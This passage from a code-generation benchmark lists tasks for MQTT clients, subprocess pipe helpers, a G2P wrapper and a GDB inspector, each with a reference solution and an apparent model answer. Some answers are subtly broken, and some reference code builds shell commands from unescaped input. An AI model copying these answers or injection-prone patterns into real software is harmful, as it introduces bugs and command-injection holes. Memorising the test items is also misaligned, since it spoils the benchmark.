logging.debug(\"Subscribing to '%s'\", device_topic)\n        mqtt_client.subscribe(device_topic)\n\n    mqtt_client.subscribe(\"/devices/status\")\n\n    mqtt_client.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\n\ndef wait_for_messages():\n    client = mqtt.Client()\n    client.on_message = on_message_callback\n    client.connect(\"broker.hivemq.com\", 1883, 60)\n    client.subscribe(\"test/topic\")\n    client.loop_forever()\n\ndef get_client():\n    client = mqtt.Client()\n    client.username_pw_set(\"user\", \"password\")\n    client.connect(\"broker.hivemq.com\", 1883, 60)\n    return client\n\ndef on_message_callback(client, userdata, message):\n    try:\n        print(f\"Received message: {message.payload.decode()} on topic: {message.topic}\")\n        # Route message to appropriate handler based on topic\n        if message.topic == \"test/topic1\":\n            handle_topic1(message)\n        elif message.topic == \"test/topic2\":\n            handle_topic2(message)\n        else:\n            print(\"Unknown topic\")\n    except Exception as e:\n        print(f\"Error processing message: {e}\")\n\ndef handle_topic1(message):\n    print(\"Handling message for topic1\")\n\ndef handle_topic2(message):\n    print(\"Handling message for topic2\")"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Python function that implements an MQTT subscriber using the Paho MQTT client library to connect to a broker, subscribe to topics, and continuously process incoming messages.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker, subscribes to specified topics, and enters a loop to continuously handle incoming messages. It includes logging for debugging purposes.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity, but could be parameterized if needed.)\n\nOutput: None (The function runs indefinitely, processing incoming messages and logging events.)",
    "Canonical_solution": "import logging\nimport paho.mqtt.client as mqtt\n\ndef mqtt_subscriber():\n    logging.basicConfig(level=logging.DEBUG)\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    logger = logging.getLogger(__name__)\n    mqttc.enable_logger(logger)\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport logging\n\nlogging.basicConfig(level=logging.DEBUG)\n\ndef mqtt_subscriber():\n    # Broker address and port\n    broker_address = \"localhost\"\n    broker_port = 1883\n\n    # Topic to subscribe to\n    topic = \"test/topic\"\n\n    # Callback function when connection is established\n    def on_connect(client, userdata, flags, rc):\n        if rc == 0:\n            logging.info(\"Connected to MQTT broker\")\n            client.subscribe(topic)\n        else:\n            logging.error(f\"Failed to connect, return code {rc}\")\n\n    # Callback function when a message is received\n    def on_message(client, userdata, msg):\n        logging.info(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    # Create an MQTT client instance\n    client = mqtt.Client()\n\n    # Assign callback functions\n    client.on_connect = on_connect\n    client.on_message = on_message\n\n    # Connect to the broker\n    client.connect(broker_address, broker_port)\n\n    # Start the loop to process messages\n    client.loop_forever()"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Implement an MQTT subscriber in Python that connects to a broker, subscribes to topics, and processes incoming messages with different callback functions for specific topic patterns.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker, sets up message callbacks for specific topic patterns, subscribes to a wildcard topic, and continuously processes incoming messages. It uses the Paho MQTT client library to handle MQTT communication.\n\nInput: None (The broker address and port are hardcoded in the function)\n\nOutput: None (The function prints incoming messages to the console but does not return any value)\n\nMethods:\n\nMethod1: on_message_msgs(mosq, obj, msg) -> None - Callback function that handles messages matching the topic pattern \"$SYS/broker/messages/#\". Prints message details to the console.\nMethod2: on_message_bytes(mosq, obj, msg) -> None - Callback function that handles messages matching the topic pattern \"$SYS/broker/bytes/#\". Prints message details to the console.\nMethod3: on_message(mosq, obj, msg) -> None - Default callback function that handles all other messages not caught by specific callbacks. Prints message details to the console.\nMethod4: mqtt_subscriber() -> None - Main function that creates an MQTT client, sets up callbacks, connects to the broker, subscribes to topics, and starts the message processing loop.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_message_msgs(mosq, obj, msg):\n    print(\"MESSAGES: \" + msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_message_bytes(mosq, obj, msg):\n    print(\"BYTES: \" + msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_message(mosq, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.message_callback_add(\"$SYS/broker/messages/#\", on_message_msgs)\n    mqttc.message_callback_add(\"$SYS/broker/bytes/#\", on_message_bytes)\n    mqttc.on_message = on_message\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\n\ndef on_message_msgs(mosq, obj, msg):\n    print(f\"Message received on topic: {msg.topic} - Payload: {msg.payload.decode()}\")\n\ndef on_message_bytes(mosq, obj, msg):\n    print(f\"Message received on topic: {msg.topic} - Payload: {msg.payload}\")\n\ndef on_message(mosq, obj, msg):\n    print(f\"Message received on topic: {msg.topic} - Payload: {msg.payload.decode()}\")\n\ndef mqtt_subscriber():\n    client = mqtt.Client()\n    client.on_message = on_message\n    client.on_message = on_message_msgs\n    client.on_message = on_message_bytes\n\n    client.connect(\"localhost\", 1883, 60)\n\n    client.subscribe(\"$SYS/broker/messages/#\")\n    client.subscribe(\"$SYS/broker/bytes/#\")\n\n    client.loop_forever()"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Implement an MQTT consumer class in Python that connects to an MQTT broker, subscribes to topics, and handles incoming messages, with optional authentication support.\n\nClass Description: The MQTTConsumer class provides functionality to connect to an MQTT broker, subscribe to topics, and process incoming messages. It includes callbacks for connection events, message reception, and message publishing. The class supports optional username/password authentication.\n\nAttributes:\n- final_mid: [int] - Stores the message ID of the final message to be published\n- client: [paho.mqtt.client.Client] - The MQTT client instance used for communication\n\nMethods:\n- __init__(client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None) -> None - Initializes the MQTT client with connection parameters and optional authentication\n- on_connect(mqttc, userdata, flags, reason_code, properties) -> None - Callback for when the client connects to the broker\n- on_message(mqttc, userdata, msg) -> None - Callback for when a message is received on a subscribed topic\n- on_publish(mqttc, userdata, mid, reason_code, properties) -> None - Callback for when a message is published\n- subscribe(topic) -> None - Subscribes to the specified topic\n- start_consuming() -> None - Starts the MQTT loop to process network traffic and messages continuously",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.final_mid = 0\n        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id)\n        self.client._userdata = False\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        \n        if username:\n            self.client.username_pw_set(username, password)\n        self.client.connect(host, port, keepalive)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        if userdata:\n            print(f\"reason_code: {reason_code}\")\n\n    def on_message(self, mqttc, userdata, msg):\n        if msg.retain == 0:\n            pass\n        else:\n            if userdata:\n                print(\"Clearing topic \" + msg.topic)\n            (rc, self.final_mid) = mqttc.publish(msg.topic, None, 1, True)\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        if mid == self.final_mid:\n            sys.exit()\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\n\nclass MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.final_mid = 0\n        self.client = mqtt.Client(client_id=client_id)\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        self.client.connect(host, port, keepalive)\n        if username and password:\n            self.client.username_pw_set(username, password)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        pass\n\n    def on_message(self, mqttc, userdata, msg):\n        pass\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        self.final_mid = mid\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.loop_forever()"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Implement a Python function that publishes messages to an MQTT broker using the Paho MQTT client library, with support for TLS/SSL encryption and authentication.\n\nFunction Description: The function `mqtt_publisher` establishes a connection to an MQTT broker, publishes a specified number of messages to a given topic at a defined interval, and handles connection events and message publishing callbacks. It supports optional TLS/SSL encryption, username/password authentication, and various MQTT QoS levels.\n\nInput:\n- `host` (str): The hostname or IP address of the MQTT broker.\n- `topic` (str): The MQTT topic to publish messages to.\n- `qos` (int): The Quality of Service level (0, 1, or 2) for message delivery.\n- `clientid` (str): The client ID to use when connecting to the broker.\n- `username` (str, optional): The username for broker authentication.\n- `disable_clean_session` (bool, optional): If True, the broker will maintain session state for the client.\n- `password` (str, optional): The password for broker authentication.\n- `port` (int, optional): The port number to connect to (defaults to 1883 for non-TLS, 8883 for TLS).\n- `nummsgs` (int): The number of messages to publish.\n- `delay` (float): The delay in seconds between publishing messages.\n- `keepalive` (int): The keepalive interval in seconds for the connection.\n- `use_tls` (bool, optional): If True, enable TLS/SSL encryption.\n- `insecure` (bool, optional): If True, disable certificate verification.\n- `cacerts` (str, optional): Path to CA certificate file for TLS/SSL.\n- `tls_version` (str, optional): The TLS version to use (\"tlsv1\", \"tlsv1.1\", or \"tlsv1.2\").\n- `debug` (bool, optional): If True, enable debug logging.\n\nOutput: None. The function publishes messages to the MQTT broker and prints status information to the console.",
    "Canonical_solution": "import argparse\nimport os\nimport ssl\nimport time\nimport paho.mqtt.client as mqtt\n\ndef mqtt_publisher(host, topic, qos, clientid, username, disable_clean_session, password, port, nummsgs, delay, keepalive, use_tls, insecure, cacerts, tls_version, debug):\n    usetls = use_tls\n    if cacerts:\n        usetls = True\n\n    if port is None:\n        if usetls:\n            port = 8883\n        else:\n            port = 1883\n\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, clientid, clean_session = not disable_clean_session)\n\n    if usetls:\n        if tls_version == \"tlsv1.2\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_2\n        elif tls_version == \"tlsv1.1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_1\n        elif tls_version == \"tlsv1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1\n        elif tls_version is None:\n            tlsVersion = None\n        else:\n            print(\"Unknown TLS version - ignoring\")\n            tlsVersion = None\n\n        if not insecure:\n            cert_required = ssl.CERT_REQUIRED\n        else:\n            cert_required = ssl.CERT_NONE\n\n        mqttc.tls_set(ca_certs=cacerts, certfile=None, keyfile=None, cert_reqs=cert_required, tls_version=tlsVersion)\n\n        if insecure:\n            mqttc.tls_insecure_set(True)\n\n    if username or password:\n        mqttc.username_pw_set(username, password)\n\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_publish = on_publish\n\n    if debug:\n        mqttc.on_log = on_log\n\n    print(\"Connecting to \"+host+\" port: \"+str(port))\n    mqttc.connect(host, port, keepalive)\n\n    mqttc.loop_start()\n\n    for x in range (0, nummsgs):\n        msg_txt = '{\"msgnum\": \"'+str(x)+'\"}'\n        print(\"Publishing: \"+msg_txt)\n        infot = mqttc.publish(topic, msg_txt, qos=qos)\n        infot.wait_for_publish()\n\n        time.sleep(delay)\n\n    mqttc.disconnect()",
    "Code_level": "Function-level",
    "FSMID_for_test": 83,
    "right_result": "import paho.mqtt.client as mqtt\nimport time\nimport logging\n\ndef mqtt_publisher(host, topic, qos, clientid, username=None, disable_clean_session=False, password=None, port=1883, nummsgs=10, delay=1.0, keepalive=60, use_tls=False, insecure=False, cacerts=None, tls_version=\"tlsv1.2\", debug=False):\n    # Configure logging\n    if debug:\n        logging.basicConfig(level=logging.DEBUG)\n    \n    # Callback for when the client connects to the broker\n    def on_connect(client, userdata, flags, rc):\n        if rc == 0:\n            print(\"Connected with result code \" + str(rc))\n            # Start publishing messages\n            for i in range(nummsgs):\n                message = f\"Message {i}\"\n                client.publish(topic, message, qos=qos)\n                time.sleep(delay)\n        else:\n            print(\"Failed to connect, return code \" + str(rc))\n    \n    # Callback for when a message is published\n    def on_publish(client, userdata, mid):\n        print(\"Message published with mid \" + str(mid))\n    \n    # Create MQTT client instance\n    client = mqtt.Client(clientid, clean_session=disable_clean_session)\n    \n    # Set username and password if provided\n    if username and password:\n        client.username_pw_set(username, password)\n    \n    # Configure TLS/SSL if required\n    if use_tls:\n        if insecure:\n            client.tls_set(ca_certs=cacerts, cert_reqs=ssl.CERT_NONE, tls_version=ssl.TLS_VERSIONS[tls_version])\n        else:\n            client.tls_set(ca_certs=cacerts, cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.TLS_VERSIONS[tls_version])\n        client.tls_handshake()\n    \n    # Set the callback functions\n    client.on_connect = on_connect\n    client.on_publish = on_publish\n    \n    # Connect to the broker\n    client.connect(host, port, keepalive)\n    \n    # Start the loop to process network traffic\n    client.loop_start()\n    \n    # Wait for the connection to be established\n    while not client.is_connected():\n        time.sleep(1)\n    \n    # Publish messages\n    client.loop_forever()"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a function to execute system commands using subprocess with pipe-based inter-process communication in Python.\n\nFunction Description: The function should run a system command in a new process, capture its output and error streams, and optionally return a boolean indicating success/failure instead of the output. It should use subprocess.PIPE for communication between processes.\n\nInput:\n- cmd: [str] - The system command to be executed\n- is_ok: [bool] (optional, default=False) - Flag to determine return type (True/False for success/failure if True, output/error if False)\n\nOutput:\n- If is_ok=True: [bool] - Returns True if command executed successfully (returncode=0), False otherwise\n- If is_ok=False: [tuple] - Returns a tuple containing (output, error) as bytes objects from stdout and stderr respectively",
    "Canonical_solution": "import subprocess\n\ndef run_cmd(cmd, is_ok=False):\n    \"\"\"\n    Run cmd\n    \"\"\"\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,\n                         shell=True, executable='/bin/bash')\n\n    output, err = p.communicate()\n    if is_ok:\n        if p.returncode == 0:\n            return True\n        else:\n            return False\n\n    return output, err",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef execute_command(cmd, is_ok=False):\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    output, error = process.communicate()\n    returncode = process.returncode\n    if is_ok:\n        return returncode == 0\n    else:\n        return (output, error)"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that runs a Python subprocess with pipe communication, compares the output with expected results from a JSON file, and asserts their equality.\n\nFunction Description: The function `run_subprocess_with_pipe` executes a Python subprocess with given arguments, captures its output through a pipe, and compares this output with expected results loaded from a JSON file. The comparison includes checking the length of the results and verifying that all elements match between the expected and actual outputs.\n\nInput:\n- `expected_file`: [str] - Path to the JSON file containing the expected output data.\n- `*args`: [variable arguments] - Additional command-line arguments to pass to the subprocess.\n\nOutput: None (The function performs assertions to validate the output against the expected results. If assertions fail, an AssertionError is raised.)",
    "Canonical_solution": "import sys\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    dg = subprocess.Popen([sys.executable] + list(args), stdout=subprocess.PIPE)\n    stdout, _ = dg.communicate()\n    expected = json.load(open(expected_file))\n    result = json.loads(stdout.decode())\n    \n    assert len(expected) == len(result)\n    assert all(r in result for r in expected)\n    assert all(r in expected for r in result)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import json\nimport subprocess\nimport sys\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    with open(expected_file, 'r') as f:\n        expected = json.load(f)\n    \n    process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    stdout, stderr = process.communicate()\n    \n    assert stdout == expected, f\"stdout does not match expected output. Got: {stdout}, Expected: {expected}\"\n    assert stderr == \"\", f\"stderr is not empty. Got: {stderr}\""
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: The task involves creating Python functions that utilize subprocess and pipes to execute shell commands and handle their input/output streams. The functions should be able to run commands directly or filter text through commands in a shell environment.\n\nFunction Description: \n\n1. `run_and_read`: Executes a shell command and captures its standard output and error streams, then returns the decoded output (prioritizing stdout over stderr if available).\n\n2. `filter_region`: Takes a text input, pipes it through a shell command (using the system's default shell or a specified shell), and returns the processed output from the command.\n\nInput:\n\n- For `run_and_read`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `cmd`: (str) - The shell command to execute\n\n- For `filter_region`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `text`: (str) - The text to be processed by the command\n  - `command`: (str) - The shell command to process the text\n\nOutput:\n\n- For `run_and_read`: (str) - The decoded output from the command (stdout if available, otherwise stderr)\n- For `filter_region`: (str) - The decoded output from the command after processing the input text",
    "Canonical_solution": "import os\nimport subprocess\nfrom subprocess import PIPE\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen([cmd],\n            stdout=PIPE,\n            stderr=PIPE,\n            shell=True).communicate()\n    try:\n        return (out or err).decode('utf-8')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, text, command):\n    shell = view.settings().get('VintageousEx_linux_shell')\n    shell = shell or os.path.expandvars(\"$SHELL\")\n    p = subprocess.Popen([shell, '-c', 'echo \"%s\" | %s' % (text, command)],\n             stderr=subprocess.PIPE,\n             stdout=subprocess.PIPE)\n    return p.communicate()[0][:-1].decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport shlex\n\ndef run_and_read(view, cmd):\n    process = subprocess.Popen(\n        shlex.split(cmd),\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    stdout, stderr = process.communicate()\n    if stdout:\n        return stdout\n    else:\n        return stderr\n\ndef filter_region(view, text, command):\n    process = subprocess.Popen(\n        shlex.split(command),\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    stdout, stderr = process.communicate(input=text)\n    if stdout:\n        return stdout\n    else:\n        return stderr"
  },
  {
    "Task_id": 284,
    "Instruction": "Task Description: Write a Python function that executes a Perl script (conlleval) via subprocess to evaluate model scores from a given file and returns the accuracy, precision, recall, and F1 score.\n\nFunction Description: The function uses subprocess.PIPE to create a pipe for inter-process communication with a Perl script. It starts the Perl process, feeds it input from a specified file, captures the output, and parses the results to extract evaluation metrics.\n\nInput:\n- path: str - The file path containing the input data to be evaluated by the Perl script\n\nOutput:\n- tuple[float, float, float, float] - A tuple containing four float values representing accuracy, precision, recall, and F1 score in that order",
    "Canonical_solution": "import subprocess\n\ndef scores(path):\n    bashCommand = 'perl conlleval'\n    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE,\n                               stdin=open(path))\n    output, error = process.communicate()\n    output = output.decode().split('\\n')[1].split('%; ')\n    output = [out.split(' ')[-1] for out in output]\n    acc, prec, recall, fb1 = tuple(output)\n    return float(acc), float(prec), float(recall), float(fb1)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef evaluate_model(path):\n    perl_cmd = ['perl', 'conlleval']\n    with open(path, 'r') as f:\n        input_data = f.read()\n    \n    process = subprocess.Popen(perl_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate(input_data.encode('utf-8'))\n    \n    if stderr:\n        raise RuntimeError(f\"Perl script error: {stderr.decode('utf-8')}\")\n    \n    output = stdout.decode('utf-8')\n    lines = output.strip().split('\\n')\n    \n    metrics = []\n    for line in lines:\n        if line.startswith('accuracy'):\n            accuracy = float(line.split()[1])\n        elif line.startswith('precision'):\n            precision = float(line.split()[1])\n        elif line.startswith('recall'):\n            recall = float(line.split()[1])\n        elif line.startswith('f1'):\n            f1 = float(line.split()[1])\n    \n    return (accuracy, precision, recall, f1)"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport logging\nimport os\nimport tempfile\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p']\n        if fst_model:\n            cmd.append('-f')\n            cmd.append(fst_model)\n        if nbest is not None:\n            cmd.append('-n')\n            cmd.append(str(nbest))\n        if is_file:\n            cmd.append('-i')\n        cmd.append(input)\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if process.returncode != 0:\n            self._logger.error(f\"Error executing phonetisaurus-g2p: {stderr.decode()}\")\n            return {}\n        return {'result': stdout.decode().strip()}\n\n    def _translate_word(self, word):\n        result = self.execute(self.fst_model, word, is_file=False, nbest=self.nbest)\n        return result\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmpfile:\n            tmpfile.write('\\n'.join(words))\n            tmpfile_path = tmpfile.name\n        result = self.execute(self.fst_model, tmpfile_path, is_file=True, nbest=self.nbest)\n        with open(tmpfile_path, 'r') as f:\n            words_list = f.read().splitlines()\n        pronunciations = {}\n        for word, pronunciation in zip(words_list, result['result'].splitlines()):\n            pronunciations[word] = pronunciation\n        return pronunciations\n\n    def translate(self, words):\n        if isinstance(words, str):\n            return self._translate_word(words)\n        elif isinstance(words, list):\n            return self._translate_words(words)\n        else:\n            self._logger.error(\"Input must be a string or a list of strings.\")\n            return {}"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: Create a function that inspects the value of a Python object in a running process by its memory address using GDB debugger through subprocess communication.\n\nFunction Description: The function uses GDB to attach to a running Python process and inspect the value of a Python object at a specified memory address. It establishes inter-process communication using subprocess.PIPE to capture GDB's output and parse the result.\n\nInput:\n- pid: [int] - Process ID of the target Python process\n- address: [str/int] - Memory address of the Python object to inspect (can be hex string or integer)\n\nOutput:\n- [str] - The string representation of the inspected Python object as returned by GDB, or None if the address couldn't be resolved",
    "Canonical_solution": "import sys\nimport subprocess\n\nencoding = sys.getdefaultencoding()\n\ndef inspect(pid, address):\n    \"Return the value of an object in a given process at the specified address\"\n    cmd = ' '.join([\n        'gdb --quiet -p %s -batch' % pid,\n        '-eval-command=\"print (PyObject *)%s\"' % address,\n    ])\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    for line in p.communicate()[0].decode(encoding).split('\\n'):\n        if line.startswith('$1 = '):\n            return line[5:]",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef inspect_python_object(pid, address):\n    # Convert address to hex string if it's an integer\n    if isinstance(address, int):\n        address = f\"{address:x}\"\n    \n    # Construct the GDB command\n    gdb_cmd = [\n        \"gdb\",\n        \"-p\", str(pid),\n        \"-ex\", \"print /x *({})\".format(address),\n        \"-ex\", \"quit\"\n    ]\n    \n    # Execute the command and capture output\n    process = subprocess.Popen(gdb_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    \n    # Check for errors\n    if process.returncode != 0:\n        return None\n    \n    # Extract the value from the output\n    match = re.search(r'(\\b[0-9a-fA-F]+\\b)', stdout.decode())\n    if match:\n        return match.group(1)\n    else:\n        return None"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words to their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words or files containing words to their phonetic pronunciations. It handles process execution, error logging, and output parsing.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for grapheme-to-phoneme conversion.\n- nbest: [int/None] - The number of best pronunciations to return for each word. If None, only the top pronunciation is returned.\n- _logger: [logging.Logger] - A logger instance for debugging and error logging.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> [None] - Initializes the PhonetisaurusG2P instance with the path to the FST model and the number of best pronunciations to return.\n  - Input Parameters:\n    - fst_model: [str] - Path to the FST model file.\n    - nbest: [int/None] - Number of best pronunciations to return (default: None).\n  - Return Type: None\n\n- execute(input, is_file=False) -> [dict] - Executes the Phonetisaurus G2P tool to convert the input word or file to phonetic pronunciations.\n  - Input Parameters:\n    - input: [str] - The input word or file path containing words to be converted.\n    - is_file: [bool] - Flag indicating whether the input is a file (default: False).\n  - Return Type: dict - A dictionary where keys are words and values are lists of pronunciations. Each pronunciation is a string.\n  - Description: This method uses subprocess.Popen to run the Phonetisaurus G2P tool, captures stdout and stderr, parses the output, and returns the results in a structured format. Errors are logged, and exceptions are raised for execution failures.",
